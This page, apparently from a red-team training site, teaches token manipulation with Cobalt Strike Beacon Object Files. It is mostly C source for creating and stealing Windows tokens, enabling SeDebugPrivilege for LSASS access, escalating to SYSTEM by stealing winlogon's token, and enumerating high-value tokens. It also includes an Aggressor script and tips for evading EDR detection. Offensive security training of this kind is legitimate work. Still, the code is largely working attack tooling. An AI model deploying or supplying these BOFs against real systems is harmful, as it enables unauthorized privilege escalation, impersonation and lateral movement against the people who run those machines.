---
layout: training-page
title: "Token Manipulation BOFs — Red Team Academy"
module: "Tool Development"
tags:
  - bof
  - token-manipulation
  - privilege-escalation
  - impersonation
  - make-token
  - steal-token
  - windows-tokens
page_key: "tool-dev-bof-token-manipulation"
render_with_liquid: false
---

# Token Manipulation BOFs

Windows access tokens are the security context attached to every process and thread. They define what user account the execution represents, what privileges are available, and what security groups the token belongs to. Token manipulation — creating, stealing, duplicating, and impersonating tokens — is a primary lateral movement and privilege escalation technique. BOF-based token manipulation avoids the process creation events that traditional tools like `runas.exe`, `token.exe`, or the Cobalt Strike `token-store` generate. MITRE ATT&CK: T1134.

---

## Windows Token Primer

### Token Structure

Every process has a **primary token** — the security context it was launched with. Every thread can have an **impersonation token** that temporarily overrides the primary token.

```
Process Token Types:
├── Primary Token (TOKEN_PRIMARY)
│   └── Attached to process at creation
│   └── Determines default access context
└── Impersonation Token (TOKEN_IMPERSONATION)
    ├── Attached to individual threads
    ├── Levels:
    │   ├── SecurityAnonymous: no identification
    │   ├── SecurityIdentification: identify only
    │   ├── SecurityImpersonation: impersonate on same system
    │   └── SecurityDelegation: impersonate over network (Kerberos)
    └── Created by DuplicateToken, ImpersonateLoggedOnUser, etc.
```

### Token Privileges

Important privileges and their implications:

| Privilege | Constant | Attack Use |
|-----------|---------|-----------|
| SeDebugPrivilege | SE_DEBUG_PRIVILEGE | Open any process including LSASS |
| SeImpersonatePrivilege | SE_IMPERSONATE_PRIVILEGE | Named pipe token theft (potato attacks) |
| SeAssignPrimaryTokenPrivilege | SE_ASSIGNPRIMARYTOKEN_PRIVILEGE | Assign arbitrary tokens to processes |
| SeBackupPrivilege | SE_BACKUP_PRIVILEGE | Read any file regardless of ACL |
| SeRestorePrivilege | SE_RESTORE_PRIVILEGE | Write any file, load drivers |
| SeTcbPrivilege | SE_TCB_PRIVILEGE | Trusted Computing Base — act as OS |
| SeCreateTokenPrivilege | SE_CREATE_TOKEN_PRIVILEGE | Create arbitrary tokens |
| SeLoadDriverPrivilege | SE_LOAD_DRIVER_PRIVILEGE | Load/unload kernel drivers |

```c
// Check and enable a specific privilege
#include "beacon.h"

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);

BOOL enable_privilege(const char *priv_name) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                                    TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    
    if (!ADVAPI32$LookupPrivilegeValueA(NULL, priv_name, &luid)) {
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }
    
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    BOOL result = ADVAPI32$AdjustTokenPrivileges(
        hToken, FALSE, &tp, sizeof(tp), NULL, NULL
    );
    
    KERNEL32$CloseHandle(hToken);
    return result && GetLastError() == ERROR_SUCCESS;
}
```

---

## make_token BOF

`make_token` creates a new logon session using provided credentials without authenticating to a DC (network logon type 9 — LOGON32_LOGON_NEW_CREDENTIALS). This is equivalent to `runas /netonly` — Beacon's local identity remains unchanged, but network authentication uses the provided credentials.

**MITRE ATT&CK: T1134.003 — Make and Impersonate Token**

```c
// make_token.c — Create impersonation token from credentials
#include "beacon.h"

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LogonUserA(
    LPCSTR, LPCSTR, LPCSTR, DWORD, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    
    char *domain   = BeaconDataExtract(&parser, NULL);  // "CORP"
    char *username = BeaconDataExtract(&parser, NULL);  // "jdoe"
    char *password = BeaconDataExtract(&parser, NULL);  // "Password123!"
    
    HANDLE hToken;
    
    // Logon type 9 = LOGON32_LOGON_NEW_CREDENTIALS
    // Creates a new outbound-only logon session
    // Local identity unchanged, network operations use supplied creds
    BOOL success = ADVAPI32$LogonUserA(
        username,
        domain,
        password,
        9,   // LOGON32_LOGON_NEW_CREDENTIALS
        3,   // LOGON32_PROVIDER_WINNT50
        &hToken
    );
    
    if (!success) {
        BeaconPrintf(CALLBACK_ERROR, "LogonUser failed: %d\n", KERNEL32$GetLastError());
        return;
    }
    
    // Impersonate the new token
    success = ADVAPI32$ImpersonateLoggedOnUser(hToken);
    KERNEL32$CloseHandle(hToken);
    
    if (success) {
        BeaconPrintf(CALLBACK_OUTPUT, 
            "[+] Token created and impersonated: %s\\%s\n", domain, username);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Network operations will use these credentials.\n"
            "[*] Run rev2self BOF when done to revert.\n"
        );
    } else {
        BeaconPrintf(CALLBACK_ERROR, "ImpersonateLoggedOnUser failed: %d\n", 
                     KERNEL32$GetLastError());
    }
}
```

```javascript
// Aggressor script:
alias make-token-bof {
    local('$domain $user $pass $args');
    $domain = $2;
    $user = $3;
    $pass = $4;
    $args = bof_pack("zzz", $domain, $user, $pass);
    beacon_inline_execute($1, script_resource("make_token.x64.o"), "go", $args);
    btask($1, "Creating token for " . $domain . "\\" . $user);
}
```

---

## steal_token BOF

`steal_token` opens an existing process, duplicates its token, and impersonates it. This allows lateral movement to SYSTEM (from a high-integrity process) or to another user's context without credentials.

**MITRE ATT&CK: T1134.001 — Token Impersonation/Theft**

```c
// steal_token.c — Steal and impersonate a process token
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DuplicateTokenEx(
    HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL,
    TOKEN_TYPE, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$SetThreadToken(PHANDLE, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    DWORD target_pid = (DWORD)BeaconDataInt(&parser);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting PID: %d\n", target_pid);
    
    // Open target process
    HANDLE hProcess = KERNEL32$OpenProcess(
        PROCESS_QUERY_INFORMATION,  // Minimal rights needed
        FALSE, target_pid
    );
    
    if (!hProcess) {
        // If PROCESS_QUERY_INFORMATION fails, try limited
        hProcess = KERNEL32$OpenProcess(
            PROCESS_QUERY_LIMITED_INFORMATION,
            FALSE, target_pid
        );
    }
    
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess failed for PID %d: %d\n", 
                     target_pid, KERNEL32$GetLastError());
        return;
    }
    
    // Get process token
    HANDLE hToken;
    if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProcess);
        return;
    }
    KERNEL32$CloseHandle(hProcess);
    
    // Extract user info before duplicating
    TOKEN_USER *user_info = NULL;
    DWORD user_info_size = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &user_info_size);
    
    // Duplicate token for impersonation
    HANDLE hDupToken;
    if (!ADVAPI32$DuplicateTokenEx(
            hToken,
            TOKEN_ALL_ACCESS,
            NULL,
            SecurityImpersonation,  // Can impersonate on local system
            TokenImpersonation,
            &hDupToken
    )) {
        BeaconPrintf(CALLBACK_ERROR, "DuplicateTokenEx failed: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return;
    }
    KERNEL32$CloseHandle(hToken);
    
    // Set token on current thread
    if (ADVAPI32$ImpersonateLoggedOnUser(hDupToken)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully impersonating token from PID %d\n", target_pid);
    } else {
        // Try SetThreadToken as alternative
        if (ADVAPI32$SetThreadToken(NULL, hDupToken)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] SetThreadToken successful for PID %d\n", target_pid);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Impersonation failed: %d\n", KERNEL32$GetLastError());
        }
    }
    
    KERNEL32$CloseHandle(hDupToken);
}
```

---

## rev2self BOF

After token manipulation, always revert to self to restore the original token. Failure to revert can leave Beacon in an unexpected security context.

```c
// rev2self.c — Revert to original process token
#include "beacon.h"

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$RevertToSelf();

void go(char *args, int args_len) {
    if (ADVAPI32$RevertToSelf()) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Reverted to original token (RevertToSelf)\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "RevertToSelf failed: %d\n", KERNEL32$GetLastError());
        // Fallback: SetThreadToken with NULL removes impersonation token
        ADVAPI32$SetThreadToken(NULL, NULL);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Attempted SetThreadToken(NULL) as fallback\n");
    }
}
```

---

## Privilege Escalation BOFs

### Enable SeDebugPrivilege

```c
// enable_debug.c — Enable SeDebugPrivilege for LSASS access
#include "beacon.h"

void go(char *args, int args_len) {
    if (enable_privilege("SeDebugPrivilege")) {
        BeaconPrintf(CALLBACK_OUTPUT, 
            "[+] SeDebugPrivilege enabled\n"
            "[*] Can now open LSASS with PROCESS_ALL_ACCESS\n"
        );
    } else {
        BeaconPrintf(CALLBACK_ERROR, 
            "Failed to enable SeDebugPrivilege\n"
            "[!] May need SYSTEM token first\n"
        );
    }
}
```

### Enable SeImpersonatePrivilege (Potato Prerequisite)

SeImpersonatePrivilege is held by service accounts (IUSR, NETWORK SERVICE, LOCAL SERVICE, IIS AppPool identities). It enables "Potato" attacks (JuicyPotato, RoguePotato, GodPotato) for local privilege escalation.

```c
// check_impersonate.c — Check if current token has SeImpersonatePrivilege
#include "beacon.h"

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupPrivilegeNameA(LPCSTR, PLUID, LPSTR, LPDWORD);

void go(char *args, int args_len) {
    HANDLE hToken;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed\n");
        return;
    }
    
    DWORD priv_size = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &priv_size);
    
    TOKEN_PRIVILEGES *privs = (TOKEN_PRIVILEGES *)KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, priv_size
    );
    
    if (!privs) return;
    
    ADVAPI32$GetTokenInformation(hToken, TokenPrivileges, privs, priv_size, &priv_size);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Token privileges:\n");
    
    for (DWORD i = 0; i < privs->PrivilegeCount; i++) {
        char priv_name[256];
        DWORD name_len = sizeof(priv_name);
        
        ADVAPI32$LookupPrivilegeNameA(NULL, &privs->Privileges[i].Luid, priv_name, &name_len);
        
        BOOL enabled = (privs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) != 0;
        BOOL enableable = (privs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) != 0;
        
        BeaconPrintf(CALLBACK_OUTPUT, "  [%c] %s\n", 
                     enabled ? '+' : '-', priv_name);
    }
    
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, privs);
    KERNEL32$CloseHandle(hToken);
}
```

---

## GetSystem BOF

GetSystem elevates from local administrator to SYSTEM by creating a service token.

**MITRE ATT&CK: T1134.002 — Create Process with Token**

```c
// get_system.c — Escalate to SYSTEM via service token impersonation
// Technique: create a service process, duplicate its token
#include "beacon.h"

DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$CreateServiceA(
    SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD,
    LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE, DWORD, LPCSTR *);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DeleteService(SC_HANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);

// Alternative simpler approach: find existing SYSTEM process, steal its token
void get_system_via_token_theft() {
    // Find winlogon.exe (runs as SYSTEM)
    DWORD winlogon_pid = 0;
    PROCESSENTRY32 pe32;
    
    HANDLE hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (KERNEL32$Process32First(hSnapshot, &pe32)) {
        do {
            if (MSVCRT$_stricmp(pe32.szExeFile, "winlogon.exe") == 0) {
                winlogon_pid = pe32.th32ProcessID;
                break;
            }
        } while (KERNEL32$Process32Next(hSnapshot, &pe32));
    }
    KERNEL32$CloseHandle(hSnapshot);
    
    if (!winlogon_pid) {
        BeaconPrintf(CALLBACK_ERROR, "winlogon.exe not found\n");
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] winlogon.exe PID: %d\n", winlogon_pid);
    
    // First enable SeDebugPrivilege
    enable_privilege("SeDebugPrivilege");
    
    // Steal token from winlogon
    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogon_pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess failed — need SeDebugPrivilege first\n");
        return;
    }
    
    HANDLE hToken, hDupToken;
    ADVAPI32$OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken);
    KERNEL32$CloseHandle(hProcess);
    
    ADVAPI32$DuplicateTokenEx(
        hToken, TOKEN_ALL_ACCESS, NULL,
        SecurityImpersonation, TokenImpersonation, &hDupToken
    );
    KERNEL32$CloseHandle(hToken);
    
    if (ADVAPI32$ImpersonateLoggedOnUser(hDupToken)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Now running as SYSTEM\n");
    }
    KERNEL32$CloseHandle(hDupToken);
}

void go(char *args, int args_len) {
    get_system_via_token_theft();
}
```

---

## Token Enumeration BOF

Before stealing tokens, enumerate all accessible process tokens to find high-value targets:

**MITRE ATT&CK: T1057 — Process Discovery**

```c
// token_enum.c — Enumerate tokens across all accessible processes
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);

void go(char *args, int args_len) {
    enable_privilege("SeDebugPrivilege");
    
    HANDLE hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed\n");
        return;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    BeaconPrintf(CALLBACK_OUTPUT, "%-8s %-25s %-30s %s\n", 
                 "PID", "Process", "User", "Session");
    BeaconPrintf(CALLBACK_OUTPUT, "%-8s %-25s %-30s %s\n",
                 "---", "-------", "----", "-------");
    
    if (KERNEL32$Process32First(hSnapshot, &pe32)) {
        do {
            HANDLE hProcess = KERNEL32$OpenProcess(
                PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID
            );
            
            if (hProcess) {
                HANDLE hToken;
                if (ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                    // Get user SID
                    DWORD user_size = 0;
                    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &user_size);
                    
                    TOKEN_USER *user_info = (TOKEN_USER *)KERNEL32$HeapAlloc(
                        KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, user_size
                    );
                    
                    if (user_info && ADVAPI32$GetTokenInformation(
                            hToken, TokenUser, user_info, user_size, &user_size)) {
                        
                        char username[256] = {0};
                        char domain[256]   = {0};
                        DWORD ulen = sizeof(username), dlen = sizeof(domain);
                        SID_NAME_USE use;
                        
                        ADVAPI32$LookupAccountSidA(
                            NULL, user_info->User.Sid,
                            username, &ulen, domain, &dlen, &use
                        );
                        
                        char full_user[512];
                        MSVCRT$sprintf(full_user, "%s\\%s", domain, username);
                        
                        // Highlight SYSTEM and interesting service accounts
                        BOOL interesting = (
                            MSVCRT$strstr(full_user, "SYSTEM") != NULL ||
                            MSVCRT$strstr(full_user, "NETWORK SERVICE") != NULL ||
                            MSVCRT$strstr(full_user, "Administrator") != NULL
                        );
                        
                        BeaconPrintf(CALLBACK_OUTPUT, "%-8d %-25s %-30s%s\n",
                            pe32.th32ProcessID, pe32.szExeFile, full_user,
                            interesting ? " <-- INTERESTING" : ""
                        );
                        
                        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, user_info);
                    }
                    KERNEL32$CloseHandle(hToken);
                }
                KERNEL32$CloseHandle(hProcess);
            }
        } while (KERNEL32$Process32Next(hSnapshot, &pe32));
    }
    
    KERNEL32$CloseHandle(hSnapshot);
}
```

---

## Cobalt Strike Built-In vs Custom BOF

Cobalt Strike provides built-in token commands. Understanding when custom BOFs are better:

| Operation | CS Built-In | Custom BOF | Prefer Custom When |
|-----------|------------|-----------|-------------------|
| make_token | `make_token DOMAIN\user pass` | make_token.c BOF | Need different logon type (e.g., interactive) |
| steal_token | `steal_token <pid>` | steal_token.c BOF | Need more control over duplication flags |
| rev2self | `rev2self` | rev2self.c BOF | Usually built-in is fine |
| getuid | `getuid` | token_enum.c BOF | Need to enumerate all tokens |
| getsystem | `getsystem` | get_system.c BOF | Built-in detection is high — use custom |

**Built-in limitations:**
- `steal_token` uses `PROCESS_QUERY_INFORMATION | PROCESS_VM_READ` — may be hooked
- `getsystem` via named pipe is well-known EDR signature
- Custom BOFs can use direct syscalls (via SysWhispers3 or similar) to bypass userland hooks
